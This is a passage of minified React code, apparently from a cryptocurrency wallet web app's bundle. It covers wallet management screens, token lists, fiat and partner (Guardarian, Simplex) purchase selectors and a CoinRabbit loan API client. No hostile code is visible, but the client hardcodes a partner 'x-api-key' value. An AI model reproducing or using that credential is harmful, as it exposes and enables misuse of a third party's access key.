            }, O.createElement("div", {
                className: u1.walletInfo
            }, O.createElement("div", {
                className: u1.walletTitle
            }, a.title, " ", O.createElement("span", {
                className: u1.walletTicker
            }, null == a || null === (t = a.ticker) || void 0 === t ? void 0 : t.toUpperCase())), O.createElement(NewTokenParentAddress, {
                newCoinOrToken: a,
                parentWalletForNewToken: r,
                wallets: n,
                handleSetParentWalletForNewToken: e => l(e)
            })), O.createElement(N1, {
                ticker: a.ticker,
                isToken: !0,
                parentWallet: r || void 0,
                token: a
            })))
        }
          , L1 = undefined
          , add_tokens_block = e => {
            let {listOfAllFletcherTokens: t} = e;
            const [a,n] = (0,
            O.useState)(A1)
              , r = (0,
            O.useMemo)(( () => null == t ? void 0 : t.slice(0, a).sort()), [a, t]);
            return O.createElement("div", {
                className: u1.walletContainer
            }, !!t.length && O.createElement("div", {
                className: Ht()(u1.wrapper, u1.wrapperWalletsAndTokens)
            }, r.map((e => O.createElement("div", {
                className: u1.walletBlockWrap,
                key: `privatekey${e.ticker}${e.smartContract}${e.address}`
            }, O.createElement(new_token_block, {
                token: e
            })))), t.length - r.length > 0 && O.createElement("div", {
                className: u1.showMoreButton,
                onClick: () => n((e => e + x1))
            }, O.createElement("img", {
                src: uS,
                width: "24px",
                height: "24px",
                className: u1.iconArrowShow,
                alt: "show more"
            }), "Show more")))
        }
        ;
        function WalletManagement() {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)($c)
              , [a,n] = (0,
            O.useState)("")
              , r = (0,
            $.v9)(_s)
              , l = (0,
            $.v9)(ws)
              , s = (0,
            $.v9)(bs)
              , i = (0,
            $.v9)(ks)
              , o = (0,
            $.v9)(Ss)
              , c = (0,
            O.useContext)(Vt)
              , {defaultWalletsFilter: u} = use_default_wallets_filter()
              , {isAllHidden: d, isAllZero: m, list: p, listOfCurrencies: f, listOfAllFletcherTokens: E, listOfMultisigs: h} = useRenderCurrencyAndToken(a);
            function toggleHiddenMode() {
                e(ds())
            }
            function toggleZeroMode() {
                e(ms())
            }
            function toggleHiddenTokensMode() {
                e(fs())
            }
            function toggleHiddenUnknownTokensMode() {
                e(Es())
            }
            const g = (0,
            O.useMemo)(( () => {
                let e = p;
                if (!a) {
                    e = p.filter(u);
                    i && (e = filterWallets(e.filter((e => !e.isSubWallet)), a, {
                        withoutSubwallets: !0
                    }))
                }
                return e
            }
            ), [i, u, p, a]);
            function toggleVisibleWallet(t) {
                e(toggleVisibilityWallet(t))
            }
            function handleSearchKeyDown(e) {
                let {keyCode: t} = e;
                27 === t && n("")
            }
            return O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: Ht()("col-xs-12 wrap", u1.noPadding)
            }, O.createElement("div", {
                className: u1.centerContainer
            }, O.createElement("div", {
                className: u1.flex
            }, O.createElement(Y.OL, {
                to: "/app",
                className: u1.back
            }, O.createElement("img", {
                src: S1,
                className: u1.iconArrow,
                alt: "Arrow"
            }), "Back"), O.createElement("div", {
                className: u1.head
            }, "Wallet management")), O.createElement("div", {
                className: u1.panelWrapper
            }, O.createElement("div", {
                className: u1.searchWrapper
            }, O.createElement("div", {
                className: u1.glassIcon
            }, O.createElement("img", {
                src: cS,
                alt: "Glass"
            })), O.createElement(Ea, {
                onChange: e => {
                    let {target: {value: t}} = e;
                    return n(t)
                }
                ,
                value: a,
                placeholder: "Search by name, currency, ticker, address",
                className: u1.searchBlock,
                onKeyDown: handleSearchKeyDown
            })), O.createElement(SortByDashboard, null)), O.createElement("div", {
                className: u1.filtersWrapper
            }, O.createElement("div", {
                className: l ? u1.filtersItemChosen : u1.filtersItem
            }, "Show hidden wallet ", O.createElement("span", {
                className: u1.counter
            }, r.length), O.createElement(yH, {
                isChecked: !l,
                handleChange: toggleHiddenMode
            })), O.createElement("div", {
                className: s ? u1.filtersItemChosen : u1.filtersItem
            }, "Show zero balances", O.createElement(yH, {
                isChecked: !s,
                handleChange: toggleZeroMode
            })), O.createElement("div", {
                className: i ? u1.filtersItemChosen : u1.filtersItem
            }, "Show tokens", O.createElement(yH, {
                isChecked: !i,
                handleChange: toggleHiddenTokensMode
            })), O.createElement("div", {
                className: o ? u1.filtersItemChosen : u1.filtersItem
            }, "Hide unknown tokens", O.createElement(yH, {
                isChecked: o,
                handleChange: toggleHiddenUnknownTokensMode
            }))), O.createElement("div", {
                className: u1.flexContainer
            }, O.createElement("div", {
                className: u1.blockLabel
            }, "YOUR WALLETS"), O.createElement(WalletExportCSV_WalletExportCSV, {
                walletsList: g
            })), O.createElement("div", {
                className: u1.walletContainer
            }, !p.length && !g.length && !!a && O.createElement("p", {
                className: u1.empty
            }, O.createElement("img", {
                src: o1,
                alt: "Empty"
            }), "Wallets not found"), !!p.length && !g.length && !a && !d && !m && O.createElement("p", {
                className: u1.empty
            }, "All wallets are hidden by the filter. Check the filter settings"), !g.length && d && !a && m && O.createElement("p", {
                className: u1.empty
            }, "All wallets are hidden by the filter. Check the filter settings"), !!p.length && !g.length && !a && m && !d && O.createElement("p", {
                className: u1.empty
            }, "All wallets are hidden by the filter. Check the filter settings"), !g.length && d && !a && !m && O.createElement("p", {
                className: u1.empty
            }, "All wallets are hidden by the filter. Check the filter settings"), !d && !t.length && !a && O.createElement("div", {
                className: u1.empty
            }, O.createElement("img", {
                src: c1,
                alt: "Empty"
            }), O.createElement("p", null, "Oops. You don’t have any wallets.")), g.map((e => O.createElement("div", {
                className: u1.walletBlockWrap,
                key: `privatekey${e.uuid}`
            }, O.createElement("div", {
                className: u1.walletBlock
            }, O.createElement("div", {
                className: u1.iconWrapper
            }, O.createElement(IconCurrency, {
                isHidden: r.indexOf(e.uuid) > -1,
                currency: e.currency,
                className: u1.ticker,
                key: `subwalletsicons${e.address}${e.currency}`
            })), O.createElement("div", {
                className: u1.infoWrapper
            }, O.createElement(rename_WalletTitle, {
                wallet: e
            }), O.createElement("div", {
                className: u1.buttonsWrapper
            }, O.createElement("div", {
                className: u1.buttonSpace
            }, !e.watchOnly && !e.hw && O.createElement(d1, {
                text: "Private key",
                onClick: () => c.open("private", {
                    wallet: e
                })
            })), O.createElement("div", {
                className: u1.buttonSpace
            }, O.createElement(d1, {
                text: r.indexOf(e.uuid) > -1 ? "Show" : "Hide",
                onClick: () => toggleVisibleWallet(e)
            }))))))))), h.length > 0 && O.createElement(O.Fragment, null, O.createElement("div", {
                className: u1.blockLabel
            }, "ADD MULTISIGS"), O.createElement(add_multisig_block, {
                listOfMultisigs: h
            })), f.length > 0 && O.createElement(O.Fragment, null, O.createElement("div", {
                className: u1.blockLabel
            }, "ADD COINS"), O.createElement(add_coins_block, {
                listOfCurrencies: f
            })), E.length > 0 && O.createElement(O.Fragment, null, O.createElement("div", {
                className: u1.blockLabel
            }, "ADD TOKENS"), O.createElement(add_tokens_block, {
                listOfAllFletcherTokens: E
            }))))))
        }
        const F1 = "exchangeMainPage_wrapper_2X_YZ app_wrapperBlock_2EpA3"
          , W1 = "exchangeMainPage_wrapperDesktop_1mpX_"
          , R1 = "exchangeMainPage_loaderCircle_1YC9u"
          , B1 = "exchangeMainPage_loaderWrapper__Z6SB"
          , O1 = "exchangeMainPage_title_2wb1g"
          , D1 = "exchangeMainPage_labelResponsive_StT3f"
          , M1 = "exchangeMainPage_wrapperForm_2jpds app_wrapperLeftBlock_3QLZp"
          , U1 = "exchangeMainPage_customWrapperCurrencies_m-Uhz"
          , G1 = "exchangeMainPage_rightMessage_3rhWd"
          , V1 = "exchangeMainPage_isWallet_2uiTU"
          , K1 = "exchangeMainPage_loaderContainer_PXPUE"
          , H1 = "exchangeMainPage_currencyFromWallet_5yiPq"
          , z1 = "exchangeMainPage_footerBlock_1hTX4 app_footerBlock_n86Kc"
          , j1 = "exchangeMainPage_stepInfo_20Pah app_stepInfo_2VLE6"
          , $1 = "exchangeMainPage_iconRevertWrapper_3TxhB"
          , Z1 = "exchangeMainPage_iconSwapWallets_2cTz7"
          , Y1 = "exchangeMainPage_checkboxText_3d4Qj"
          , q1 = "exchangeMainPage_loader_7OGPq"
          , X1 = "exchangeMainPage_external_3p64q"
          , Q1 = "exchangeMainPage_addressWrapper_3v9tP"
          , J1 = "exchangeMainPage_displayNone_VmhCs"
          , e2 = "exchangeMainPage_feeTooltipIcon_3hbfX"
          , t2 = "exchangeMainPage_networkFeeTooltip_33u28"
          , a2 = "exchangeMainPage_feeTooltip_2Ob7_"
          , n2 = "exchangeMainPage_userSelect__paJG"
          , r2 = "exchangeMainPage_inputWrapper_18pw1"
          , l2 = "exchangeMainPage_walletsWrapper_1Tv2x"
          , s2 = "exchangeMainPage_wrapperList_36Kp6"
          , i2 = "exchangeMainPage_marginTop_1tZbT"
          , o2 = "exchangeMainPage_availableBlock_a7g28"
          , c2 = "exchangeMainPage_infoTitle_1fdkF"
          , u2 = "exchangeMainPage_infoValue_Kgu3E"
          , d2 = "exchangeMainPage_labelReceiverWrapper_3QeQf"
          , m2 = "exchangeMainPage_exchangeInfo_3JoMV"
          , p2 = "exchangeMainPage_exchangeRate_bsnJU"
          , f2 = "exchangeMainPage_exchangeNetworkFee_3Ax0I"
          , E2 = "exchangeMainPage_resultBlock_1rEcd"
          , h2 = "exchangeMainPage_currencyPairMsg_1Z86P"
          , g2 = "exchangeMainPage_insufficientFundsMsg_3GN6y"
          , y2 = "exchangeMainPage_errorInput_3-Ind"
          , v2 = "exchangeMainPage_exchangeMobileInput_1RAqB"
          , _2 = "exchangeMainPage_toWalletInput_26378"
          , w2 = "exchangeMainPage_inputWrapperClassName_1NOT1"
          , b2 = "exchangeMainPage_errorInfo_3hSHU"
          , k2 = "exchangeMainPage_blockerError_3nsmT"
          , S2 = "exchangeMainPage_invalidAddress_11yVP"
          , C2 = "exchangeMainPage_feeWalletError_2DW0a"
          , N2 = "exchangeMainPage_supportRef_3g1yl"
          , T2 = "exchangeMainPage_undoButton_2SUHG"
          , A2 = "exchangeMainPage_timeToExecution_2cUBe"
          , x2 = "exchangeMainPage_undoText_18s8U"
          , I2 = "exchangeMainPage_exchangeNotification_3HT53"
          , P2 = "exchangeMainPage_providerWrapper_3baZY"
          , L2 = "exchangeMainPage_providerBlockTitle_1pHqA"
          , F2 = "exchangeMainPage_providerItem_1c8Nk"
          , W2 = "exchangeMainPage_providerIcon_5Kdj6"
          , R2 = "exchangeMainPage_providerInfo_3LLp5"
          , B2 = "exchangeMainPage_providerName_3KJv1"
          , O2 = "exchangeMainPage_providerDescription_2JiYv"
          , D2 = "exchangeMainPage_providerModalWrapper_24X1n"
          , M2 = "exchangeMainPage_providerModalImg_3pL70"
          , U2 = "exchangeMainPage_providerModalDescription_2GdSr"
          , G2 = "exchangeMainPage_approveMsg_36vvY"
          , V2 = "exchangeMainPage_checking_1iNgV";
        var K2 = a(79169)
          , H2 = a.n(K2);
        const isSellFiatSupported = e => Boolean(dS.H.find((t => (0,
        Ho.t)(t.ticker) === (0,
        Ho.t)(e))));
        function fiat_list_FiatList(e) {
            var t;
            const a = (0,
            $.v9)(UO)
              , [n,r] = (0,
            O.useState)("");
            function getFullInfoForFiatList(e) {
                if ("sell" === e) {
                    const e = null == a ? void 0 : a.filter((e => isSellFiatSupported(e)));
                    return null == e ? void 0 : e.map((e => (0,
                    be.l2)(e)))
                }
                return null == a ? void 0 : a.map((e => (0,
                be.l2)(e)))
            }
            const [l,s] = (0,
            O.useState)(( () => getFullInfoForFiatList(e.side)));
            (0,
            O.useEffect)(( () => {
                if (a) {
                    const t = getFullInfoForFiatList(e.side);
                    if (t.length) {
                        s(t);
                        o(t)
                    }
                }
            }
            ), [a, e.side]);
            const [i,o] = (0,
            O.useState)(l)
              , [c,u] = (0,
            O.useState)(!1)
              , handleSelect = t => () => {
                e.onChange(String(t).toLowerCase());
                u(!1)
            }
              , handleSearch = e => {
                let {target: t} = e;
                r(t.value);
                o(( () => l.filter((e => (null == e ? void 0 : e.title.toLowerCase().includes(t.value.toLowerCase())) || (null == e ? void 0 : e.ticker.toLowerCase().includes(t.value.toLowerCase()))))))
            }
            ;
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: GN,
                onClick: () => {
                    u(!c);
                    r("");
                    o(l);
                    null == e || e.setVisibleErrors(!1)
                }
            }, O.createElement("div", {
                className: VN
            }, O.createElement(UN, {
                className: qN,
                currencyTicker: e.selected
            }), O.createElement("span", {
                className: HN
            }, null === (t = (0,
            be.l2)(e.selected || "usd")) || void 0 === t ? void 0 : t.title, O.createElement("p", {
                className: jN
            }, null == e ? void 0 : e.selected))), O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: dh()
                },
                className: KN
            })), O.createElement(Xl(), {
                visible: c,
                onClose: () => u(!1)
            }, O.createElement(rT, {
                horizontalPosition: {
                    left: 0
                },
                verticalPosition: {
                    top: 64
                },
                search: n,
                filteredList: i,
                handleSelect,
                handleSearch
            })))
        }
        fiat_list_FiatList.propTypes = {
            onChange: as().func.isRequired,
            selected: as().string,
            setVisibleErrors: as().func,
            side: as().string
        };
        const z2 = {
            wrapper: "buy-sell_wrapper_xlW_2 app_wrapperBlock_2EpA3",
            leftBlock: "buy-sell_leftBlock_vNG-E",
            displayFlex: "buy-sell_displayFlex_E5fo1",
            rightBlock: "buy-sell_rightBlock_1EYlZ",
            leftBlockTitle: "buy-sell_leftBlockTitle_1oN4G",
            message: "buy-sell_message_2Fl2D",
            emptyBackupMessage: "buy-sell_emptyBackupMessage_agpeH",
            messageInfo: "buy-sell_messageInfo_2vXbv",
            messagePartnerError: "buy-sell_messagePartnerError_2te4R",
            wrapperMainPage: "buy-sell_wrapperMainPage_2WaiQ",
            wrapperForm: "buy-sell_wrapperForm_2cgLz app_wrapperLeftBlock_3QLZp",
            errorInput: "buy-sell_errorInput_YK29a",
            changeSideWrapper: "buy-sell_changeSideWrapper_2dMFW",
            changeSideIcon: "buy-sell_changeSideIcon_bs8GE",
            footerBlock: "buy-sell_footerBlock_2Jt2Q app_footerBlock_n86Kc",
            buyNotify: "buy-sell_buyNotify_2vfg1",
            buyNotifyText: "buy-sell_buyNotifyText_2hNqi",
            iconClock: "buy-sell_iconClock_fSaa3",
            iconInformation: "buy-sell_iconInformation_2ua6Y",
            buyNotifyTextItem: "buy-sell_buyNotifyTextItem_1B6fn",
            stepInfo: "buy-sell_stepInfo_DvZBQ",
            loaderWrapper: "buy-sell_loaderWrapper_1bMb2",
            desktopInfo: "buy-sell_desktopInfo_1Sl25",
            notify: "buy-sell_notify_3HRX_",
            amountNotify: "buy-sell_amountNotify_3ZIPL",
            amountNotifyLink: "buy-sell_amountNotifyLink_2hP7t",
            toWalletInput: "buy-sell_toWalletInput_2nOcs",
            inputErrorCustomWrapper: "buy-sell_inputErrorCustomWrapper_2ZDUk",
            inputCurrencyCustomWrapper: "buy-sell_inputCurrencyCustomWrapper_ZUhYt",
            inputWrapperClassName: "buy-sell_inputWrapperClassName_1Kfhn",
            footerButtons: "buy-sell_footerButtons_2daND",
            networkError: "buy-sell_networkError_2rc0o",
            buttonBuySell: "buy-sell_buttonBuySell_1O9Iv",
            infoSmallLink: "buy-sell_infoSmallLink_3pVxj",
            loader: "buy-sell_loader_1rIDf",
            popupWrapper: "buy-sell_popupWrapper_W4Afx",
            choosePartnerWrapper: "buy-sell_choosePartnerWrapper_1iCut",
            choosePartnerHeader: "buy-sell_choosePartnerHeader_3XpUj",
            choosePartnerWrapperTitle: "buy-sell_choosePartnerWrapperTitle_1O-sj",
            loaderBeforePartner: "buy-sell_loaderBeforePartner_2GYCa",
            cursorPointer: "buy-sell_cursorPointer_35na3",
            choosePartnerTitle: "buy-sell_choosePartnerTitle_3zvwb",
            choosePartnerTitleMain: "buy-sell_choosePartnerTitleMain_3VaKe",
            partnerTitle: "buy-sell_partnerTitle_1iISJ",
            choosePartnerNotify: "buy-sell_choosePartnerNotify_gx4fD",
            choosePartnerNotifyMain: "buy-sell_choosePartnerNotifyMain_1W4Tf",
            iconAccordionArrow: "buy-sell_iconAccordionArrow_23cRB",
            isShow: "buy-sell_isShow_37vbX",
            choosePartnerAccWrapper: "buy-sell_choosePartnerAccWrapper_3rKjC",
            choosePartnerAccName: "buy-sell_choosePartnerAccName_2evUG",
            choosePartnerAccItem: "buy-sell_choosePartnerAccItem_3wmBL",
            inputRadio: "buy-sell_inputRadio_2f_m-",
            partnerIcon: "buy-sell_partnerIcon_NsdEG",
            choosePartnerList: "buy-sell_choosePartnerList_2K9rT",
            choosePartnerListItem: "buy-sell_choosePartnerListItem_E-YEr",
            choosePartnerPaymentTermsItem: "buy-sell_choosePartnerPaymentTermsItem_1NStn",
            choosePartnerPayWrapper: "buy-sell_choosePartnerPayWrapper_3Qvn1",
            choosePartnerPaymentTerms: "buy-sell_choosePartnerPaymentTerms_W0ghy",
            checkmark: "buy-sell_checkmark_15PHn",
            isCheked: "buy-sell_isCheked_2bFOR",
            details: "buy-sell_details_tD_PJ",
            moreDetails: "buy-sell_moreDetails_24RLz",
            detailsTooltip: "buy-sell_detailsTooltip_3J3dS",
            detailsList: "buy-sell_detailsList_3lHD7",
            walletsWrapper: "buy-sell_walletsWrapper_2un4l"
        };
        var j2 = a(65418)
          , $2 = a.n(j2)
          , Z2 = a(57333);
        const Y2 = "input-value-and-select_wrapper_1l-sK"
          , q2 = "input-value-and-select_placeholder_xcHDA"
          , X2 = "input-value-and-select_placeholderDarkElectron_2i9CH"
          , Q2 = "input-value-and-select_wrapperCurrencies_1hEfS"
          , J2 = "input-value-and-select_wrapperCurrenciesNoWidth_1uw_Z"
          , e3 = "input-value-and-select_wrapperCurrenciesFiat_29vqe"
          , t3 = "input-value-and-select_wrapperWhileNotFiat_3KWHX"
          , a3 = "input-value-and-select_fiatTiker_N_6JK"
          , n3 = "input-value-and-select_wrapperInput_3fe9J"
          , r3 = "input-value-and-select_onlyInputWrapper_Egdqw"
          , l3 = "input-value-and-select_isInvalid_mdBLJ"
          , s3 = "input-value-and-select_responsiveInputWrapper_2rdn0"
          , i3 = "input-value-and-select_loader_1xvBt"
          , o3 = "input-value-and-select_responsiveLoader_1GGEa"
          , c3 = "input-value-and-select_disabled_3JwHl"
          , u3 = "input-value-and-select_value_tQZPI"
          , d3 = "input-value-and-select_tooltip_28Or_";
        let m3 = 0;
        const InputValueAndSelect_InputValueAndSelect = e => {
            const {onChange: t, onEnter: a, onKeyDown: n, title: r, noWidth: l, children: s, disabled: i, fiat: o, isLoading: c, value: u, isInvalid: d, customWrapper: m, noChildren: p, isDashLoader: f, className: E, customWrapperCurrencies: h, isSelectorWithValue: g, isFormatNumberPosition: y, withTooltip: v} = e
              , [_] = (0,
            O.useState)(navigator.onLine)
              , w = v && u.length >= 17
              , b = (0,
            O.useMemo)(( () => (0,
            M.tq)() || (0,
            M.p1)()), []);
            function handleChangeValue(e) {
                let {target: a} = e;
                if (!t)
                    return;
                const n = (0,
                Ko.y4)(a.value)
                  , r = undefined;
                if (!(a.value.split(".").length > 2) && (!/[^0-9.]/.test(a.value) || g)) {
                    m3 = a.selectionStart || 0;
                    t(n)
                }
            }
            const handleOnKeyDown = e => {
                e.key >= "0" && e.key <= "9" || "." === e.key || "," === e.key || "Backspace" === e.key || "Delete" === e.key || "ArrowLeft" === e.key || "ArrowRight" === e.key || "ArrowUp" === e.key || "ArrowDown" === e.key || "Enter" === e.key || e.preventDefault();
                "Enter" === e.key && a && a(e);
                n && n(e)
            }
              , onValueChange = e => {
                const {formattedValue: a} = e;
                t && t(a)
            }
            ;
            return O.createElement("div", {
                className: Ht()(Y2, m && m, E && E)
            }, O.createElement("span", {
                className: Ht()(q2, {
                    [X2]: g
                })
            }, r), O.createElement("div", {
                className: Ht()(Q2, {
                    [J2]: l
                }, h)
            }, s), !p && O.createElement("div", {
                className: Ht()(n3, {
                    [c3]: i
                }, {
                    [J2]: l
                }, {
                    [e3]: o
                }, {
                    [t3]: !o
                }, {
                    [l3]: d
                }, {
                    [s3]: g && b
                })
            }, c && _ ? O.createElement("div", {
                className: Ht()(i3, {
                    [o3]: g && b
                })
            }, f ? O.createElement(O.Fragment, null, "-") : O.createElement(LoaderDots, {
                visible: c
            })) : y ? O.createElement(Z2.h3, {
                className: u3,
                type: "text",
                value: u,
                thousandSeparator: " ",
                allowNegative: !1,
                allowLeadingZeros: !0,
                autoFocus: !0,
                name: "lastpass-fix-search",
                autoComplete: "off",
                onValueChange,
                placeholder: "-",
                disabled: i,
                onKeyDown: handleOnKeyDown
            }) : w ? O.createElement(tooltip, {
                text: u,
                top: "18%",
                left: "30%",
                classNameTooltip: d3
            }, O.createElement("input", {
                autoFocus: !0,
                className: u3,
                value: u,
                name: "lastpass-fix-search",
                autoComplete: "off",
                onChange: handleChangeValue,
                placeholder: "-",
                disabled: i,
                onKeyDown: handleOnKeyDown
            })) : O.createElement("input", {
                autoFocus: !0,
                className: u3,
                value: u,
                name: "lastpass-fix-search",
                autoComplete: "off",
                onChange: handleChangeValue,
                placeholder: "-",
                disabled: i,
                onKeyDown: handleOnKeyDown
            }), o && O.createElement("div", {
                className: Ht()(a3, {
                    [l3]: d
                })
            }, (0,
            be.xG)(o))), p && O.createElement("div", {
                className: Ht()(r3, {
                    [e3]: o
                })
            }, O.createElement("input", {
                className: u3,
                autoFocus: !0,
                value: u,
                onChange: handleChangeValue,
                placeholder: "-",
                disabled: i,
                onKeyDown: handleOnKeyDown,
                onFocus: e => {
                    i || (e.target.selectionStart = m3)
                }
            }), " ", o && O.createElement("div", {
                className: Ht()(a3, {
                    [l3]: d
                })
            }, (0,
            be.xG)(o))))
        }
          , p3 = a.p + "6ed38bea1dbed65c28f626536e4924b6.svg"
          , ChooseGuardarian = e => {
            let {choosenPartner: t, changePartner: a, partner: n, willReceive: r, currencyTo: l, selectedFiat: s, maxLimit: i, minLimit: o, side: c} = e;
            const u = undefined
              , d = z2.choosePartnerListItem;
            let m = `\n  <ul class="${z2.detailsList}">\n    <li class="${d}">ID verification needed</li>\n    <li class="${d}">Verification can take up to 3 minutes</li>\n    <li class="${d}">Progress updates are provided in real time</li>\n`;
            s && i && (m += `\n    <li class="${d}">\n      Purchase max limit: ${(0,
            Ko.yF)(i)} ${s.toUpperCase()}\n    </li>\n  `);
            s && o && (m += `\n    <li class="${d}">\n      Purchase min limit: ${(0,
            Ko.yF)(o)} ${s.toUpperCase()}\n    </li>\n  `);
            m += "</ul>";
            return O.createElement("div", {
                className: z2.choosePartnerAccItem
            }, O.createElement("label", {
                htmlFor: "guardarian",
                className: z2.choosePartnerAccName
            }, O.createElement("input", {
                type: "radio",
                id: "guardarian",
                name: "partners",
                value: "guardarian",
                defaultChecked: "guardarian" === t,
                onClick: () => a("guardarian"),
                className: z2.inputRadio
            }), O.createElement("div", {
                className: Ht()(z2.checkmark, {
                    [z2.isCheked]: "guardarian" === t
                })
            }), O.createElement("img", {
                width: 30,
                height: 30,
                alt: "guardarian icon",
                src: p3,
                className: z2.partnerIcon
            }), O.createElement("div", null, O.createElement("div", {
                className: z2.choosePartnerWrapperTitle
            }, O.createElement("p", {
                className: Ht()(z2.choosePartnerTitle, z2.partnerTitle)
            }, "guardarian"), "guardarian" === n && O.createElement("p", {
                className: z2.choosePartnerNotify
            }, "Best Rate")))), O.createElement(visa_mastercard, {
                isNew: !0,
                withSepa: "guardarian" === n,
                withUnionPay: "buy" === c && "guardarian" === n,
                withVisa: "buy" === c,
                withMasterCard: "buy" === c
            }), O.createElement("div", {
                className: z2.details
            }, O.createElement("div", {
                className: Ht()(z2.moreDetails, z2.cursorPointer)
            }, O.createElement(tooltip, {
                positionVertical: "bottom",
                left: -50,
                text: m,
                width: "max-content",
                classNameTooltip: z2.detailsTooltip
            }, "More details")), O.createElement("div", {
                className: z2.choosePartnerPaymentTerms
            }, O.createElement("p", {
                className: z2.choosePartnerPaymentTermsItem
            }, r && l && `~${r} ${l}`))))
        }
          , f3 = a.p + "a267b767df39d13d17ba5d7475ae4a77.svg"
          , ChooseSimplex = e => {
            let {choosenPartner: t, changePartner: a, partner: n, willReceive: r, currencyTo: l, selectedFiat: s, maxLimit: i, minLimit: o} = e;
            const c = undefined
              , u = z2.choosePartnerListItem;
            let d = `\n  <ul class="${z2.detailsList}">\n    <li class="${u}">ID verification needed</li>\n    <li class="${u}">It can take up to 20 minutes to verify your ID</li>\n    <li class="${u}">You will be informed about results by email</li>\n`;
            s && i && (d += `\n    <li class="${u}">\n      Purchase max limit: ${(0,
            Ko.yF)(i)} ${s.toUpperCase()}\n    </li>\n  `);
            s && o && (d += `\n    <li class="${u}">\n      Purchase min limit: ${(0,
            Ko.yF)(o)} ${s.toUpperCase()}\n    </li>\n  `);
            d += "</ul>";
            return O.createElement("div", {
                className: z2.choosePartnerAccItem
            }, O.createElement("label", {
                htmlFor: "simplex",
                className: z2.choosePartnerAccName
            }, O.createElement("input", {
                type: "radio",
                id: "simplex",
                name: "partners",
                value: "simplex",
                defaultChecked: "simplex" === t,
                onClick: () => a("simplex"),
                className: z2.inputRadio
            }), O.createElement("div", {
                className: Ht()(z2.checkmark, {
                    [z2.isCheked]: "simplex" === t
                })
            }), O.createElement("img", {
                width: 30,
                height: 30,
                alt: "simplex icon",
                src: f3,
                className: z2.partnerIcon
            }), O.createElement("div", null, O.createElement("div", {
                className: z2.choosePartnerWrapperTitle
            }, O.createElement("p", {
                className: Ht()(z2.choosePartnerTitle, z2.partnerTitle)
            }, "simplex"), "simplex" === n && O.createElement("p", {
                className: z2.choosePartnerNotify
            }, "Best Rate")))), O.createElement(visa_mastercard, {
                isNew: !0,
                withApple: !0
            }), O.createElement("div", {
                className: z2.details
            }, O.createElement("div", {
                className: Ht()(z2.moreDetails, z2.cursorPointer)
            }, O.createElement(tooltip, {
                positionVertical: "bottom",
                left: -50,
                text: d,
                width: "max-content",
                classNameTooltip: z2.detailsTooltip
            }, "More details")), O.createElement("div", {
                className: z2.choosePartnerPaymentTerms
            }, O.createElement("p", {
                className: z2.choosePartnerPaymentTermsItem
            }, r && l && `~${r} ${l}`))))
        }
          , ErrorText = e => {
            let {online: t, isPartnerError: a} = e;
            return t ? a ? O.createElement(O.Fragment, null, "Transaction failed") : null : O.createElement(O.Fragment, null, "Network error. Please check your connection")
        }
          , E3 = a.p + "ec31a9f49b60b98e37cab7ae5d4cfd9b.svg"
          , h3 = {
            ada: "ada-shelley"
        }
          , g3 = undefined
          , patcher = e => ({
            ...e,
            family: h3[e.family] || e.family
        })
          , fetchFletcherTokens = async e => {
            try {
                var t;
                const {data: a} = await bc.w.get("/all/list?entities=token", {
                    signal: null == e ? void 0 : e.signal
                })
                  , n = a && (null === (t = a.list) || void 0 === t ? void 0 : t.map(patcher)) || []
                  , r = n.reduce(( (e, t) => {
                    const a = `${t.ticker}-${t.family}`;
                    e[a] || (e[a] = []);
                    e[a].push(t);
                    return e
                }
                ), {})
                  , l = n.filter((e => {
                    const t = `${e.ticker}-${e.family}`
                      , a = r[t].some((e => e.contract));
                    return e.contract || !a
                }
                ));
                return l
            } catch (e) {
                return []
            }
        }
          , fetchFletcherAllList = async e => {
            try {
                var t;
                const {data: a} = await bc.w.get("/all/list?sort=bestRank", {
                    signal: null == e ? void 0 : e.signal
                });
                return a && (null === (t = a.list) || void 0 === t ? void 0 : t.map(patcher)) || []
            } catch (e) {
                return []
            }
        }
          , getTokenParams = e => {
            var t;
            return {
                ticker: e.ticker,
                title: e.title || e.ticker.toUpperCase(),
                smartContract: e.contract || "",
                precision: parseInt(String(null !== (t = e.decimals) && void 0 !== t ? t : "NaN"), 10) || void 0,
                rank: e.rank
            }
        }
        ;
        var y3 = a(95847);
        const mapperBorrowV1ToV2Loan = (e, t, a) => {
            var n, r;
            const l = (null === (n = a.deposit) || void 0 === n || null === (r = n.find((t => (0,
            y3.Z)(t.currency) === (0,
            y3.Z)(e.deposit.currency_code) && (0,
            y3.Z)(t.network) === (0,
            y3.Z)(e.deposit.currency_network)))) || void 0 === r ? void 0 : r.smart_contract) || void 0
              , s = l ? (0,
            y3.Z)(l) : void 0;
            return {
                loan_id: e.loan_id,
                status: e.status,
                loan: {
                    ...e.loan,
                    currency: (0,
                    y3.Z)(e.loan.currency_code)
                },
                deposit: {
                    ...e.deposit,
                    currency: (0,
                    y3.Z)(e.deposit.currency_code),
                    currency_network: (0,
                    y3.Z)(e.deposit.currency_network),
                    smartContract: s
                },
                repayment: {
                    ...e.repayment,
                    currency: (0,
                    y3.Z)(e.repayment.currency_code),
                    payout_tx: {
                        ...e.repayment.payout_tx,
                        hash: e.repayment.payout_tx.hash,
                        timestamp: e.repayment.payout_tx.timestamp
                    },
                    payin_txs: e.repayment.payin_txs.map((e => ({
                        ...e
                    })))
                },
                increase: {
                    ...e.increase,
                    currency: (0,
                    y3.Z)(e.increase.currency_code)
                },
                closed_at: e.closed_at,
                updated_at: e.updated_at,
                created_at: e.created_at,
                interest_percent: e.interest_percent,
                interest_amounts: {
                    ...e.interest_amounts
                },
                close_price: e.close_price,
                liquidation_price: e.liquidation_price,
                side: e.rate_side,
                rate_side: e.rate_side,
                user: {
                    ...t
                },
                max: 0
            }
        }
          , v3 = Jf().create({
            baseURL: "https://api.coinrabbit.io",
            headers: {
                "x-api-key": "e919ac35-0867-417e-962b-27c5178cc14b"
            }
        })
          , borrowGetUser = () => async e => {
            try {
                if (v3.defaults.headers.common["x-user-token"])
                    return;
                const t = await e(getSecureData("uuid"))
                  , {data: a} = await v3.post("/v2/auth/partner", {
                    external_id: t
                });
                v3.defaults.headers.common["x-user-token"] = a.response.token;
                const {data: {response: n}} = await v3.get("/v2/users");
                await e(_3.setUser({
                    user: n
                }))
            } catch (e) {
                ge.b.error(ge.d.LOAN_AUTH_USER, e)
            }
        }
          , _3 = {
            setUser: (0,
            te.createAction)("@borrow/setUser.COMMIT")(),
            setUserLoans: (0,
